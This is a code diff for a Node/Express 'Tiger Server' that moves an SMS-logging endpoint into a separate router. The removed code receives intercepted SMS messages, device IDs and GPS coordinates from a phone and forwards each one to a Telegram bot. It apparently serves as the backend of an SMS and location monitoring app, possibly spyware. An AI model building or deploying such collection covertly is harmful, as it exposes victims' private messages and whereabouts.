@@ -13,78 +13,29 @@ app.use(express.static(path.join(__dirname, 'public')));
 // Routes
 const logsRouter = require('./routes/logs');
 const usersRouter = require('./routes/users');
+const evidenceRouter = require('./routes/evidence');
+const statsRouter = require('./routes/stats');
+
 app.use('/', logsRouter);
 app.use('/users', usersRouter);
+app.use('/', evidenceRouter);
+app.use('/stats', statsRouter);
 
 // Telegram is handled per-user (User model stores telegramBotToken & telegramChatId). Do NOT use global hard-coded tokens here.
-
-let smsLogs = [];
 
 app.get('/admin', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-app.post('/log-sms', async (req, res) => {
-    try {
-        const { sender, message, device, deviceId, timestamp, location } = req.body;
-        
-        const newEntry = {
-            id: Date.now(),
-            device: device || 'Tiger-Mobile',
-            deviceId: deviceId || 'unknown',
-            sender: sender || 'Unknown',
-            message: message || 'No Content',
-            time: timestamp || new Date().toLocaleString(),
-            location: location || "Disabled"
-        };
+// Note: log-related routes are handled by routes/logs.js
+// - POST /log-sms
+// - GET /get-logs
+// - POST /clear-logs
+// - POST /trigger-ping
+// These are registered via app.use('/', logsRouter);
 
-        smsLogs.unshift(newEntry);
-        if (smsLogs.length > 200) smsLogs.pop();
-
-        // ✅ Correct Map URL Logic: Mobile app se "lat,long" string aati hai
-        const mapUrl = (newEntry.location !== "Disabled") 
-            ? `\n📍 Location: https://www.google.com/maps?q=${newEntry.location}` 
-            : '\n📍 Location: Not Available';
-
-        const telegramMsg = `🐯 *Tiger Alert!*\n\n` +
-                          `📱 *Device:* ${newEntry.device} (${newEntry.deviceId})\n` +
-                          `👤 *From:* ${newEntry.sender}\n` +
-                          `💬 *Message:* ${newEntry.message}\n` +
-                          `⏰ *Time:* ${newEntry.time}` + mapUrl;
-        console.log(`[Server] Sending to Telegram: ${telegramMsg}`);
-        const telegramResponse = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            chat_id: CHAT_ID,
-            text: telegramMsg,
-            parse_mode: 'Markdown'
-        });
-        console.log(`[Server] Telegram Response:`, telegramResponse.data);
-
-        console.log(`[✓] Data sent to Telegram from ${newEntry.sender}`);
-        res.status(200).json({ status: 'success' });
-
-    } catch (error) {
-        console.error('[Server] Error Details:', error.response ? error.response.data : error.message);
-        console.error('[Server] Full Error:', error);
-        // Handle common issues
-        if (error.code === 'ENOTFOUND' || error.message.includes('Network Error')) {
-          console.warn('[Server] Possible issues: Wrong Telegram token/CHAT_ID, network issues, or Telegram API down.');
-        }
-        res.status(500).json({ status: 'error' });
-    }
-});
-
-app.get('/get-logs', (req, res) => {
-    const deviceId = req.query.deviceId;
-    if (deviceId) {
-      return res.json(smsLogs.filter(log => log.deviceId === deviceId));
-    }
-    res.json(smsLogs);
-});
-
-app.post('/clear-logs', (req, res) => {
-    smsLogs = [];
-    res.json({ success: true });
-});
+// Keep backward-compatible root
+app.get('/', (req, res) => res.json({ status: 'Tiger Server running' }));
 
 const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => {
